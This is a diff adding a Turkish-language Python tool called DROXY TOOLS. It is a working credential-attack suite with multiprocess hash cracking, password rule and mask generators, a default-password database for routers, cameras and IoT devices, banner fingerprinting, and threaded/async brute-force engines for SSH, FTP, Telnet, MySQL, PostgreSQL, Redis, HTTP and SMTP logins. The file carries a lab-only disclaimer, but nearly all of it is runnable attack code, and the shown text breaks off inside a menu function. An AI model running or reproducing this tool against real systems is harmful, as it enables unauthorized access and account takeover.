@@ -1,0 +1,1027 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+================================================================
+ DROXY TOOLS v26.1.2 — SÜRÜM 5.0 "ULTIMATE"
+================================================================
+ Yalnızca KENDİ LABORTUVAR / YETKİLİ ortamınızda kullanın.
+
+ Modüller:
+   [1] Saldırı santrali (sync + async, 9 protokol)
+   [2] Hash kırma (çoklu-process: MD5/SHA1/SHA256/SHA512/NTLM/bcrypt)
+   [3] Kural motoru (best64 uyumlu)
+   [4] Mask attack (desen tabanlı: ?u?l?l?d?d?d)
+   [5] Banner fingerprint + varsayılan kimlik DB
+   [6] Wordlist üretici (katman 1-3)
+   [7] Servis taraması
+   [8] Parola güç analizi
+   [9] Sonuç raporları
+================================================================
+"""
+
+import os
+import sys
+import time
+import json
+import socket
+import hashlib
+import asyncio
+import itertools
+import datetime
+import string
+import traceback
+import multiprocessing
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# ------------------------------------------------------------
+# OPSİYONEL BAĞIMLILIKLAR
+# ------------------------------------------------------------
+OPTIONAL = {}
+try:
+    import paramiko; OPTIONAL["ssh"] = True
+except ImportError: OPTIONAL["ssh"] = False
+try:
+    import requests; OPTIONAL["http"] = True
+except ImportError: OPTIONAL["http"] = False
+try:
+    import pymysql; OPTIONAL["mysql"] = True
+except ImportError: OPTIONAL["mysql"] = False
+try:
+    import psycopg2; OPTIONAL["postgres"] = True
+except ImportError: OPTIONAL["postgres"] = False
+try:
+    import bcrypt; OPTIONAL["bcrypt"] = True
+except ImportError: OPTIONAL["bcrypt"] = False
+
+# ------------------------------------------------------------
+# RENKLER
+# ------------------------------------------------------------
+YESIL="\033[92m"; KIRMIZI="\033[91m"; SARI="\033[93m"; MAVI="\033[94m"
+BEYAZ="\033[97m"; CYAN="\033[96m"; MOR="\033[95m"; RESET="\033[0m"
+KALIN="\033[1m"; SOLUK="\033[90m"
+
+def temizle(): os.system("cls" if os.name=="nt" else "clear")
+def bekle(): input(f"\n{MAVI}Ana menüye dönmek için ENTER...{RESET}")
+def baslik(m):
+    print(); print(f"{MAVI}{'='*68}{RESET}")
+    print(f"{BEYAZ}{KALIN}{m:^68}{RESET}")
+    print(f"{MAVI}{'='*68}{RESET}")
+
+class Config:
+    VERSION="26.1.2"; SURUM="5.0"; YAPIMCI="MarkOs"
+    WL_DIR="wordlists"; RULE_DIR="rules"; SONUC_DIR="sonuclar"
+    LOG_FILE="sonuclar/droxy_activity.log"
+    @classmethod
+    def hazirla(cls):
+        for d in (cls.WL_DIR, cls.RULE_DIR, cls.SONUC_DIR):
+            os.makedirs(d, exist_ok=True)
+CFG=Config()
+
+def log_yaz(mesaj):
+    try:
+        with open(CFG.LOG_FILE,"a",encoding="utf-8") as f:
+            ts=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            f.write(f"[{ts}] {mesaj}\n")
+    except OSError: pass
+
+# ------------------------------------------------------------
+# GLOBAL DURUM
+# ------------------------------------------------------------
+class GlobalState:
+    evt=threading.Event()
+    @classmethod
+    def durdur(cls): cls.evt.set()
+    @classmethod
+    def durdu(cls): return cls.evt.is_set()
+    @classmethod
+    def sifirla(cls): cls.evt.clear()
+
+# ------------------------------------------------------------
+# WORDLIST MOTORU
+# ------------------------------------------------------------
+class WordlistMotoru:
+    BASE_WORDS=[
+        "123456789","password","qwerty","123456","111111","12345678",
+        "abc123","password1","admin","letmein","welcome","monkey",
+        "dragon","master","login","toor","root","test","guest","info",
+        "oracle","postgres","mysql","ubuntu","kali","debian","sunshine",
+        "master1","princess","starwars","solo","msfadmin","raspberry"]
+    SUFFIXES=["","!","@","#","*","123","1234","2024","2025","2026",
+              "01","1","!!",".","12345","2023","007"]
+    LEET={"a":"4","e":"3","i":"1","o":"0","s":"5","t":"7"}
+    USERS=["admin","administrator","root","user","test","guest",
+           "oracle","postgres","mysql","ftp","pi","ubuntu","service",
+           "backup","sysadmin","dev","deploy","kali","msfadmin"]
+
+    @classmethod
+    def uret(cls,katman):
+        gorulen=set()
+        def ekle(v):
+            if v and v not in gorulen:
+                gorulen.add(v); return v
+            return None
+        for w in cls.BASE_WORDS:
+            for v in (w,w.lower(),w.upper(),w.capitalize()):
+                r=ekle(v)
+                if r: yield r
+        if katman in ("2","3"):
+            for w in cls.BASE_WORDS:
+                for s in cls.SUFFIXES:
+                    for v in (f"{w}{s}",f"{w.capitalize()}{s}",f"{w.upper()}{s}"):
+                        r=ekle(v)
+                        if r: yield r
+        if katman=="3":
+            for w1,w2 in itertools.permutations(cls.BASE_WORDS[:12],2):
+                for v in (f"{w1}{w2}",f"{w1.capitalize()}{w2}",f"{w1}_{w2}"):
+                    r=ekle(v)
+                    if r: yield r
+            for w in cls.BASE_WORDS:
+                leet="".join(cls.LEET.get(c.lower(),c) for c in w)
+                r=ekle(leet)
+                if r: yield r
+                for s in cls.SUFFIXES:
+                    r=ekle(f"{leet}{s}")
+                    if r: yield r
+
+    @classmethod
+    def dosyaya_yaz(cls,katman,yol):
+        t=0
+        with open(yol,"w",encoding="utf-8") as f:
+            for k in cls.uret(katman):
+                f.write(k+"\n"); t+=1
+        return t
+
+    @staticmethod
+    def dosyadan_oku(yol):
+        try:
+            with open(yol,"r",encoding="utf-8",errors="ignore") as f:
+                return [l.strip() for l in f if l.strip()]
+        except OSError as e:
+            print(f"{KIRMIZI}[!] Okunamadı: {e}{RESET}"); return []
+
+# ------------------------------------------------------------
+# [YENİ] MASK ENGINE
+# ------------------------------------------------------------
+class MaskEngine:
+    MASKE={
+        "?l":string.ascii_lowercase,
+        "?u":string.ascii_uppercase,
+        "?d":string.digits,
+        "?s":"!@#$%^&*()-_+=.",
+        "?a":string.ascii_letters+string.digits+"!@#$%^&*()-_+=.",
+        "?h":"0123456789abcdef",
+    }
+
+    @classmethod
+    def coz(cls,maske):
+        """'?u?l?l?d?d?d' -> [pozisyon charsetleri]"""
+        pozisyonlar=[]; i=0
+        while i<len(maske):
+            if maske[i]=="?" and i+1<len(maske):
+                token=maske[i:i+2]
+                if token in cls.MASKE:
+                    pozisyonlar.append(cls.MASKE[token]); i+=2; continue
+            pozisyonlar.append(maske[i]); i+=1
+        return pozisyonlar
+
+    @classmethod
+    def uret(cls,maske,max_sayi=None):
+        pozisyonlar=cls.coz(maske)
+        tahmini=1
+        for p in pozisyonlar: tahmini*=len(p)
+        if max_sayi and tahmini>max_sayi:
+            print(f"{KIRMIZI}[!] Maske {tahmini} kombinasyon üretir, limit {max_sayi}.{RESET}")
+            return
+        for parca in itertools.product(*pozisyonlar):
+            yield "".join(parca)
+
+    @staticmethod
+    def tahmini_sayi(maske):
+        p=MaskEngine.coz(maske)
+        n=1
+        for c in p: n*=len(c)
+        return n
+
+# ------------------------------------------------------------
+# RULE ENGINE
+# ------------------------------------------------------------
+class RuleEngine:
+    def __init__(self): self.kurallar=[[]]
+    def dosya_yukle(self,yol):
+        try:
+            with open(yol,"r",encoding="utf-8",errors="ignore") as f:
+                for satir in f:
+                    satir=satir.strip()
+                    if not satir or satir.startswith("#"): continue
+                    if satir.endswith("#") and satir[:-1].isdigit():
+                        self.kurallar.append([]); continue
+                    self.kurallar[-1].append(satir)
+            return sum(len(k) for k in self.kurallar)
+        except OSError as e:
+            print(f"{KIRMIZI}[!] {e}{RESET}"); return 0
+
+    def uygula(self,kelime):
+        sonuclar=set()
+        for zincir in self.kurallar:
+            m=kelime
+            for kural in zincir:
+                m=self._tek(m,kural)
+                if m is None: break
+            if m: sonuclar.add(m)
+        return sonuclar
+
+    def _tek(self,k,kural):
+        try:
+            if kural==":": return k
+            if kural=="l": return k.lower()
+            if kural=="u": return k.upper()
+            if kural=="c": return k.capitalize()
+            if kural=="C": return k.lower().capitalize()
+            if kural=="r": return k[::-1]
+            if kural=="d": return k+k
+            if kural.startswith("$"): return k+kural[1:]
+            if kural.startswith("^"): return kural[1:]+k
+            if kural.startswith("s") and len(kural)==3: return k.replace(kural[1],kural[2])
+            if kural.startswith("D") and kural[1:].isdigit():
+                n=int(kural[1:]); return k[:n]+k[n+1:]
+            if kural.startswith("o") and len(kural)==3 and kural[1].isdigit():
+                n=int(kural[1])
+                return k[:n]+kural[2]+k[n+1:] if n<len(k) else k
+            if kural.startswith("y") and kural[1:].isdigit():
+                n=int(kural[1:]); return k+k[:n]
+            return k
+        except Exception: return k
+
+    @classmethod
+    def ornek_uret(cls,yol):
+        kurallar="""# Droxy best64-benzeri
+:
+l
+u
+c
+r
+d
+$1
+$2
+$3
+$!
+$@
+$#
+$123
+$1234
+$2024
+$2025
+$2026
+^1
+^!
+^@
+s a4
+s e3
+s i1
+s o0
+s s5
+l $1
+l $!
+u $1
+c $1
+c $!
+l r
+u r
+s a4 $!
+$1 $!
+y1
+y2
+"""
+        try:
+            with open(yol,"w",encoding="utf-8") as f: f.write(kurallar)
+            return True
+        except OSError: return False
+
+# ------------------------------------------------------------
+# HASH MOTORU
+# ------------------------------------------------------------
+class HashMotoru:
+    ALGOLAR={"1":("MD5","md5"),"2":("SHA1","sha1"),"3":("SHA256","sha256"),
+             "4":("SHA512","sha512"),"5":("NTLM","ntlm"),"6":("bcrypt","bcrypt")}
+
+    @staticmethod
+    def hash_uret(p,alg):
+        b=p.encode("utf-8")
+        if alg=="md5": return hashlib.md5(b).hexdigest()
+        if alg=="sha1": return hashlib.sha1(b).hexdigest()
+        if alg=="sha256": return hashlib.sha256(b).hexdigest()
+        if alg=="sha512": return hashlib.sha512(b).hexdigest()
+        if alg=="ntlm":
+            try: return hashlib.new("md4",p.encode("utf-16le")).hexdigest()
+            except Exception: return None
+        return None
+
+    @staticmethod
+    def _isci_paket(paket):
+        hedef,alg,parolalar=paket
+        bulunan=[]
+        for p in parolalar:
+            if alg=="bcrypt":
+                if OPTIONAL["bcrypt"]:
+                    try:
+                        if bcrypt.checkpw(p.encode(),hedef.encode()):
+                            bulunan.append(p)
+                    except Exception: pass
+            else:
+                if HashMotoru.hash_uret(p,alg)==hedef: bulunan.append(p)
+        return bulunan
+
+    @classmethod
+    def kir(cls,hedef,alg,wordlist,proses=None):
+        if proses is None: proses=max(1,multiprocessing.cpu_count()-1)
+        if alg=="bcrypt": proses=1
+        bas=time.time()
+        parca=max(1,len(wordlist)//proses)
+        paketler=[(hedef,alg,wordlist[i:i+parca])
+                  for i in range(0,len(wordlist),parca)]
+        bulunan=None
+        with multiprocessing.Pool(processes=proses) as pool:
+            for sonuc in pool.imap_unordered(cls._isci_paket,paketler):
+                if sonuc:
+                    bulunan=sonuc[0]; pool.terminate(); break
+        sure=time.time()-bas
+        deneme=wordlist.index(bulunan)+1 if bulunan else len(wordlist)
+        return bulunan,deneme,sure
+
+    @staticmethod
+    def tespit(h):
+        h=h.strip()
+        if h.startswith("$2"): return "bcrypt"
+        for uzunluk,alg in ((32,"md5"),(40,"sha1"),(64,"sha256"),(128,"sha512")):
+            if len(h)==uzunluk and all(c in "0123456789abcdef" for c in h.lower()):
+                return alg
+        return None
+
+# ------------------------------------------------------------
+# FINGERPRINT
+# ------------------------------------------------------------
+class Fingerprint:
+    KIMLIKLER={
+        "ssh":[("root","toor"),("root","root"),("admin","admin"),
+               ("pi","raspberry"),("ubuntu","ubuntu"),("kali","kali"),
+               ("msfadmin","msfadmin"),("user","password")],
+        "ftp":[("admin","admin"),("ftp","ftp"),("anonymous",""),
+               ("msfadmin","msfadmin")],
+        "telnet":[("admin","admin"),("root","root"),("cisco","cisco"),
+                  ("ubnt","ubnt"),("msfadmin","msfadmin")],
+        "mysql":[("root",""),("root","root"),("root","toor"),("mysql","mysql")],
+        "postgres":[("postgres","postgres"),("postgres","password")],
+        "redis":[("",""),("default","")],
+        "http-basic":[("admin","admin"),("admin","password"),("root","root")],
+        "cctv":[("admin","admin"),("admin","12345"),("root","pass"),
+                ("666666","666666"),("admin","1111")],
+        "router":[("admin","admin"),("admin","password"),("cisco","cisco"),
+                  ("ubnt","ubnt"),("root","admin")],
+        "iot":[("admin","admin"),("root","root"),("root","xc3511"),
+               ("root","vizxv"),("guest","guest"),("ubnt","ubnt")],
+        "smtp":[("admin","admin"),("test","test")],
+    }
+    IMZALAR=[
+        ("openssh|dropbear","ssh"),("vsftpd|proftpd|pure-ftpd|pyftpdlib","ftp"),
+        ("telnet","telnet"),("mysql|mariadb","mysql"),("postgresql","postgres"),
+        ("redis","redis"),("apache|nginx|iis|tomcat","http-basic"),
+        ("hikvision|dahua|dvr|nvr|ipcam","cctv"),
+        ("mikrotik|tp-link|d-link|netgear|asus","router"),
+        ("postfix|exim|dovecot","smtp")]
+
+    @staticmethod
+    def banner_grab(hedef,port,timeout=3.0):
+        try:
+            s=socket.socket(); s.settimeout(timeout)
+            s.connect((hedef,port)); time.sleep(0.3)
+            s.sendall(b"\r\n"); time.sleep(0.5)
+            veri=s.recv(2048).decode(errors="ignore")
+            s.close(); return veri.strip()
+        except Exception: return ""
+
+    @classmethod
+    def oneri(cls,hedef,port):
+        banner=cls.banner_grab(hedef,port)
+        kat="http-basic"; aciklama="Port tabanlı tahmin"
+        if banner:
+            for desen,k in cls.IMZALAR:
+                if desen in banner.lower(): kat=k; aciklama=f"Banner: {desen}"; break
+        else:
+            pmap={22:"ssh",21:"ftp",23:"telnet",3306:"mysql",5432:"postgres",
+                  6379:"redis",25:"smtp",587:"smtp",465:"smtp"}
+            kat=pmap.get(port,"http-basic")
+        kimlikler=list(dict.fromkeys(cls.KIMLIKLER.get(kat,[])+cls.KIMLIKLER["iot"][:5]))
+        return {"banner":banner,"kategori":kat,"aciklama":aciklama,"kimlikler":kimlikler}
+
+# ------------------------------------------------------------
+# PROTOKOL MOTORLARI
+# ------------------------------------------------------------
+class R:
+    BASARI="basari"; KIMLIK="hata_kimlik"; BAGLANTI="hata_baglanti"
+
+class Motorlar:
+    @staticmethod
+    def ssh_deneme(h,p,u,w,t):
+        if not OPTIONAL["ssh"]: return R.BAGLANTI,"paramiko yok"
+        c=None
+        try:
+            c=paramiko.SSHClient()
+            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            c.connect(hostname=h,port=p,username=u,password=w,timeout=t,
+                      allow_agent=False,look_for_keys=False,
+                      banner_timeout=t,auth_timeout=t)
+            return R.BASARI,None
+        except paramiko.AuthenticationException: return R.KIMLIK,None
+        except Exception as e: return R.BAGLANTI,str(e)[:80]
+        finally:
+            try:
+                if c: c.close()
+            except Exception: pass
+
+    @staticmethod
+    def ftp_deneme(h,p,u,w,t):
+        from ftplib import FTP,error_perm
+        f=None
+        try:
+            f=FTP(); f.connect(host=h,port=p,timeout=t)
+            f.login(user=u,passwd=w); f.quit()
+            return R.BASARI,None
+        except error_perm: return R.KIMLIK,None
+        except Exception as e: return R.BAGLANTI,str(e)[:80]
+        finally:
+            try:
+                if f: f.close()
+            except Exception: pass
+
+    @staticmethod
+    def telnet_deneme(h,p,u,w,t):
+        try:
+            s=socket.socket(); s.settimeout(t); s.connect((h,p))
+            try: s.recv(1024)
+            except socket.timeout: pass
+            s.sendall(f"{u}\r\n".encode()); time.sleep(0.15)
+            try: s.recv(1024)
+            except socket.timeout: pass
+            s.sendall(f"{w}\r\n".encode()); time.sleep(0.4)
+            try: yanit=s.recv(4096).decode(errors="ignore").lower()
+            except socket.timeout: yanit=""
+            s.close()
+            for x in ("incorrect","invalid","denied","failed","wrong"):
+                if x in yanit: return R.KIMLIK,None
+            for x in ("$","#",">","last login","welcome"):
+                if x in yanit: return R.BASARI,None
+            return R.KIMLIK,None
+        except Exception as e: return R.BAGLANTI,str(e)[:80]
+
+    @staticmethod
+    def mysql_deneme(h,p,u,w,t):
+        if not OPTIONAL["mysql"]: return R.BAGLANTI,"pymysql yok"
+        try:
+            c=pymysql.connect(host=h,port=p,user=u,password=w,connect_timeout=t)
+            c.close(); return R.BASARI,None
+        except Exception as e:
+            m=str(e).lower()
+            return (R.KIMLIK,None) if ("access denied" in m or "1045" in m) \
+                else (R.BAGLANTI,str(e)[:80])
+
+    @staticmethod
+    def postgres_deneme(h,p,u,w,t):
+        if not OPTIONAL["postgres"]: return R.BAGLANTI,"psycopg2 yok"
+        try:
+            c=psycopg2.connect(host=h,port=p,user=u,password=w,
+                               connect_timeout=t,dbname="postgres")
+            c.close(); return R.BASARI,None
+        except Exception as e:
+            m=str(e).lower()
+            return (R.KIMLIK,None) if "28p01" in m or "authentication failed" in m \
+                else (R.BAGLANTI,str(e)[:80])
+
+    @staticmethod
+    def redis_deneme(h,p,u,w,t):
+        try:
+            s=socket.socket(); s.settimeout(t); s.connect((h,p))
+            cmd=f"AUTH {u} {w}\r\n" if u else f"AUTH {w}\r\n"
+            s.sendall(cmd.encode())
+            y=s.recv(256).decode(errors="ignore"); s.close()
+            return (R.BASARI,None) if y.startswith("+OK") else (R.KIMLIK,None)
+        except Exception as e: return R.BAGLANTI,str(e)[:80]
+
+    @staticmethod
+    def http_basic_deneme(h,p,u,w,t,scheme="http",path="/"):
+        if not OPTIONAL["http"]: return R.BAGLANTI,"requests yok"
+        try:
+            r=requests.get(f"{scheme}://{h}:{p}{path}",auth=(u,w),
+                           timeout=t,allow_redirects=False,verify=False)
+            return (R.BASARI,None) if r.status_code==200 or \
+                r.status_code in (301,302,303,307,308) else (R.KIMLIK,None)
+        except Exception as e: return R.BAGLANTI,str(e)[:80]
+
+    @staticmethod
+    def http_post_deneme(h,p,u,w,t,scheme="http",form_tanim=None):
+        if not OPTIONAL["http"]: return R.BAGLANTI,"requests yok"
+        if not form_tanim: return R.BAGLANTI,"form tanımı eksik"
+        parca=form_tanim.split(":")
+        if len(parca)<2: return R.BAGLANTI,"form geçersiz"
+        yol=parca[0]; body=parca[1]
+        F=S=None; redir=False
+        for q in parca[2:]:
+            if q.startswith("F="): F=q[2:]
+            elif q.startswith("S="): S=q[2:]
+            elif q.startswith("R="): redir=q[2:].lower() in ("1","true","yes")
+        b=body.replace("^USER^",u).replace("^PASS^",w)
+        try:
+            r=requests.post(f"{scheme}://{h}:{p}{yol}",data=b,timeout=t,
+                            allow_redirects=not redir,verify=False,
+                            headers={"Content-Type":"application/x-www-form-urlencoded"})
+            if S and S in r.text: return R.BASARI,None
+            if F and F in r.text: return R.KIMLIK,None
+            if redir and r.status_code in (301,302,303,307,308): return R.BASARI,None
+            if r.status_code==200 and not F: return R.BASARI,None
+            return R.KIMLIK,None
+        except Exception as e: return R.BAGLANTI,str(e)[:80]
+
+    @staticmethod
+    def smtp_deneme(h,p,u,w,t):
+        import smtplib
+        try:
+            if p==465: sm=smtplib.SMTP_SSL(h,p,timeout=t)
+            else:
+                sm=smtplib.SMTP(h,p,timeout=t)
+                try: sm.starttls()
+                except smtplib.SMTPException: pass
+            sm.login(u,w); sm.quit(); return R.BASARI,None
+        except smtplib.SMTPAuthenticationError: return R.KIMLIK,None
+        except Exception as e: return R.BAGLANTI,str(e)[:80]
+
+# ------------------------------------------------------------
+# ASYNC MOTORLAR
+# ------------------------------------------------------------
+class AsyncMotorlar:
+    @staticmethod
+    async def raw(h,p,veri,bekleme,t):
+        r,w_=await asyncio.wait_for(asyncio.open_connection(h,p),timeout=t)
+        try: await asyncio.wait_for(r.read(1024),timeout=t)
+        except asyncio.TimeoutError: pass
+        w_.write(veri); await w_.drain(); await asyncio.sleep(bekleme)
+        try: y=await asyncio.wait_for(r.read(4096),timeout=t)
+        except asyncio.TimeoutError: y=b""
+        w_.close()
+        try: await w_.wait_closed()
+        except Exception: pass
+        return y.decode(errors="ignore")
+
+    @classmethod
+    async def redis_deneme(cls,h,p,u,w,t):
+        cmd=f"AUTH {u} {w}\r\n" if u else f"AUTH {w}\r\n"
+        try:
+            y=await cls.raw(h,p,cmd.encode(),0.05,t)
+            return (R.BASARI,None) if y.startswith("+OK") else (R.KIMLIK,None)
+        except Exception as e: return R.BAGLANTI,str(e)[:80]
+
+    @classmethod
+    async def telnet_deneme(cls,h,p,u,w,t):
+        try:
+            y=(await cls.raw(h,p,f"{u}\r\n{w}\r\n".encode(),0.4,t)).lower()
+            for x in ("incorrect","invalid","denied","failed","wrong"):
+                if x in y: return R.KIMLIK,None
+            for x in ("$","#",">","last login","welcome"):
+                if x in y: return R.BASARI,None
+            return R.KIMLIK,None
+        except Exception as e: return R.BAGLANTI,str(e)[:80]
+
+    @staticmethod
+    async def sarmal(motor,h,p,u,w,t):
+        loop=asyncio.get_event_loop()
+        return await loop.run_in_executor(None,lambda: motor(h,p,u,w,t))
+
+    @staticmethod
+    async def http_basic_deneme(h,p,u,w,t,scheme="http",path="/"):
+        loop=asyncio.get_event_loop()
+        return await loop.run_in_executor(
+            None,lambda: Motorlar.http_basic_deneme(h,p,u,w,t,scheme,path))
+
+    @staticmethod
+    async def http_post_deneme(h,p,u,w,t,scheme="http",form_tanim=None):
+        loop=asyncio.get_event_loop()
+        return await loop.run_in_executor(
+            None,lambda: Motorlar.http_post_deneme(h,p,u,w,t,scheme,form_tanim))
+
+SERVISLER={
+    "1":{"ad":"SSH","motor":"ssh","port":22},
+    "2":{"ad":"FTP","motor":"ftp","port":21},
+    "3":{"ad":"Telnet","motor":"telnet","port":23},
+    "4":{"ad":"MySQL","motor":"mysql","port":3306},
+    "5":{"ad":"PostgreSQL","motor":"postgres","port":5432},
+    "6":{"ad":"Redis","motor":"redis","port":6379},
+    "7":{"ad":"HTTP Basic","motor":"http_basic","port":80},
+    "8":{"ad":"HTTP POST Form","motor":"http_post","port":80},
+    "9":{"ad":"SMTP AUTH","motor":"smtp","port":587},
+}
+ASYNC_YERLI={"redis","telnet","http_basic","http_post"}
+
+# ------------------------------------------------------------
+# STATS
+# ------------------------------------------------------------
+class Stats:
+    def __init__(self,toplam):
+        self.lock=threading.Lock(); self.toplam=toplam
+        self.deneme=0; self.hata=0; self.bulundu=[]; self.bas=time.time()
+    def artir(self,hatali=False):
+        with self.lock:
+            self.deneme+=1
+            if hatali: self.hata+=1
+    def hit(self,u,p):
+        with self.lock: self.bulundu.append((u,p))
+    def canli(self):
+        gecen=time.time()-self.bas
+        hiz=self.deneme/gecen if gecen>0 else 0
+        yuzde=self.deneme/self.toplam*100 if self.toplam else 0
+        dolu=int(30*yuzde/100); bar="█"*dolu+"░"*(30-dolu)
+        eta=(self.toplam-self.deneme)/hiz if hiz>0 else 0
+        sys.stdout.write(
+            f"\r{CYAN}[{bar}]{RESET} {BEYAZ}{self.deneme}/{self.toplam}{RESET} "
+            f"({yuzde:.1f}%) {SARI}{hiz:.0f}/sn{RESET} ETA:{int(eta)}s "
+            f"{YESIL}✓{len(self.bulundu)}{RESET} {KIRMIZI}✗{self.hata}{RESET}   ")
+        sys.stdout.flush()
+    def ozet(self):
+        gecen=time.time()-self.bas
+        hiz=self.deneme/gecen if gecen>0 else 0
+        print(f"\n\n{MAVI}{'─'*50}{RESET}")
+        print(f"{CYAN}[i] Deneme: {self.deneme} | Hata: {self.hata} | "
+              f"Hız: {hiz:.1f}/sn | Süre: {gecen:.1f}sn{RESET}")
+        if self.bulundu:
+            print(f"{YESIL}[+] BULUNAN KİMLİKLER:{RESET}")
+            for u,p in self.bulundu: print(f"    {YESIL}{u} : {p}{RESET}")
+        else:
+            print(f"{KIRMIZI}[-] Geçerli kimlik bulunamadı.{RESET}")
+        print(f"{MAVI}{'─'*50}{RESET}")
+
+# ------------------------------------------------------------
+# SANTRAL
+# ------------------------------------------------------------
+class Santral:
+    def __init__(self,servis_no,hedef,port,users,passes,threads,timeout,
+                 async_mode=True,ek=None):
+        self.s=SERVISLER[servis_no]; self.hedef=hedef; self.port=port
+        self.users=users; self.passes=passes
+        self.threads=threads; self.timeout=timeout
+        self.async_mode=async_mode; self.ek=ek or {}
+
+    def _tek_sync(self,u,p):
+        motor=getattr(Motorlar,f"{self.s['motor']}_deneme")
+        try:
+            return motor(self.hedef,self.port,u,p,self.timeout,
+                         **{k:v for k,v in self.ek.items()
+                            if k in motor.__code__.co_varnames})
+        except TypeError:
+            return motor(self.hedef,self.port,u,p,self.timeout)
+
+    async def _tek_async(self,u,p):
+        m=self.s["motor"]
+        if m in ASYNC_YERLI:
+            motor=getattr(AsyncMotorlar,f"{m}_deneme")
+            try:
+                return await motor(self.hedef,self.port,u,p,self.timeout,**self.ek)
+            except TypeError:
+                return await motor(self.hedef,self.port,u,p,self.timeout)
+        return await AsyncMotorlar.sarmal(
+            getattr(Motorlar,f"{m}_deneme"),self.hedef,self.port,u,p,self.timeout)
+
+    def _hit_isle(self,stats,u,p):
+        stats.artir(); stats.hit(u,p)
+        log_yaz(f"FOUND | {self.s['ad']}://{self.hedef}:{self.port} | {u}:{p}")
+        print(f"\n{YESIL}{KALIN}[+] BAŞARILI! {self.s['ad']}://"
+              f"{self.hedef}:{self.port} → {u}:{p}{RESET}")
+
+    def calistir(self):
+        GlobalState.sifirla()
+        kombo=list(itertools.product(self.users,self.passes))
+        if not kombo:
+            print(f"{KIRMIZI}[!] Kombinasyon yok.{RESET}"); return
+        stats=Stats(len(kombo))
+        print(f"\n{MOR}[*] Santral başlıyor ({'ASYNC' if self.async_mode else 'SYNC'})...{RESET}")
+        print(f"{CYAN}    {self.hedef}:{self.port} | {self.s['ad']} | "
+              f"{len(kombo)} kombinasyon{RESET}\n")
+        bas=time.time()
+
+        if self.async_mode:
+            async def kos():
+                sem=asyncio.Semaphore(self.threads)
+                async def isci(u,p):
+                    if GlobalState.durdu(): return
+                    async with sem:
+                        sonuc,_=await self._tek_async(u,p)
+                    if sonuc==R.BASARI: self._hit_isle(stats,u,p)
+                    elif sonuc==R.KIMLIK: stats.artir()
+                    else: stats.artir(hatali=True)
+                    if stats.deneme%200==0: stats.canli()
+                await asyncio.gather(*[isci(u,p) for u,p in kombo],
+                                     return_exceptions=True)
+            asyncio.run(kos())
+        else:
+            def isci(u,p):
+                if GlobalState.durdu(): return
+                sonuc,_=self._tek_sync(u,p)
+                if sonuc==R.BASARI: self._hit_isle(stats,u,p)
+                elif sonuc==R.KIMLIK: stats.artir()
+                else: stats.artir(hatali=True)
+                if stats.deneme%100==0: stats.canli()
+            with ThreadPoolExecutor(max_workers=self.threads) as ex:
+                for _ in as_completed([ex.submit(isci,u,p) for u,p in kombo]):
+                    if GlobalState.durdu(): break
+
+        stats.ozet()
+        self._rapor(stats,time.time()-bas)
+        return stats
+
+    def _rapor(self,stats,gecen):
+        ts=datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        yol=os.path.join(CFG.SONUC_DIR,
+            f"droxy5_{self.s['motor']}_{ts}.txt")
+        try:
+            with open(yol,"w",encoding="utf-8") as f:
+                f.write(f"DROXY v{CFG.VERSION} S{CFG.SURUM} RAPOR\n"+"="*50+"\n")
+                f.write(f"Hedef : {self.hedef}:{self.port} ({self.s['ad']})\n")
+                f.write(f"Deneme: {stats.deneme} | Hata: {stats.hata}\n")
+                f.write(f"Süre  : {gecen:.2f} sn\n\n")
+                for u,p in stats.bulundu: f.write(f"  {u} : {p}\n")
+            print(f"{CYAN}[i] Rapor: {yol}{RESET}")
+        except OSError as e:
+            print(f"{KIRMIZI}[!] {e}{RESET}")
+
+# ------------------------------------------------------------
+# MENÜLER
+# ------------------------------------------------------------
+def banner():
+    print(f"""{MOR}{KALIN}
+================================================================
+  D R O X Y   T O O L S   v{CFG.VERSION}
+  ═════════════════════════════════════════
+  SÜRÜM {CFG.SURUM} — ULTIMATE | Yapımcı: {CFG.YAPIMCI}
+================================================================
+{RESET}""")
+    durum=" | ".join(f"{k}:{YESIL}✓{RESET}" if v else f"{k}:{KIRMIZI}✗{RESET}"
+                     for k,v in OPTIONAL.items())
+    print(f"{CYAN}[{durum}]{RESET}")
+    print(f"{KIRMIZI}[!] Yalnızca YETKİLİ lab ortamında kullanın.{RESET}\n")
+
+def kimlik_kaynak():
+    print(f"\n{BEYAZ}Kullanıcı kaynağı: [1]Tek [2]Dahili [3]Dosya{RESET}")
+    us=input(f"{SARI}Seçim: {RESET}").strip()
+    users=([input(f"{BEYAZ}[?] Kullanıcı: {RESET}").strip()]
+           if us=="1" else
+           WordlistMotoru.USERS if us=="2" else
+           WordlistMotoru.dosyadan_oku(input(f"{BEYAZ}[?] Yol: {RESET}").strip()))
+    print(f"\n{BEYAZ}Parola kaynağı: [1]Tek [2]Droxy üret [3]Dosya [4]Mask{RESET}")
+    ps=input(f"{SARI}Seçim: {RESET}").strip()
+    if ps=="1": passes=[input(f"{BEYAZ}[?] Parola: {RESET}")]
+    elif ps=="2":
+        kat=input(f"{BEYAZ}[?] Katman(1-3)[2]: {RESET}").strip() or "2"
+        passes=list(WordlistMotoru.uret(kat))
+    elif ps=="3": passes=WordlistMotoru.dosyadan_oku(
+        input(f"{BEYAZ}[?] Wordlist yolu: {RESET}").strip())
+    elif ps=="4":
+        m=input(f"{BEYAZ}[?] Maske (örn ?u?l?l?d?d?d): {RESET}").strip()
+        passes=list(MaskEngine.uret(m))
+    else: passes=[]
+    return [u for u in users if u],[p for p in passes if p]
+
+def menu_saldiri():
+    temizle(); banner(); baslik("SALDIRI SANTRALİ")
+    for n,s in SERVISLER.items():
+        print(f"  [{n}] {s['ad']:<18} {SOLUK}(port {s['port']}){RESET}")
+    sec=input(f"\n{SARI}Servis: {RESET}").strip()
+    if sec not in SERVISLER: bekle(); return
+    sv=SERVISLER[sec]
+    hedef=input(f"{BEYAZ}[?] Hedef IP: {RESET}").strip()
+    if not hedef: bekle(); return
+    ps=input(f"{BEYAZ}[?] Port [{sv['port']}]: {RESET}").strip()
+    port=int(ps) if ps.isdigit() else sv["port"]
+
+    # Fingerprint
+    print(f"\n{MOR}[*] Parmak izi alınıyor...{RESET}")
+    fp=Fingerprint.oneri(hedef,port)
+    if fp["banner"]: print(f"{CYAN}[i] Banner: {fp['banner'][:90]}{RESET}")
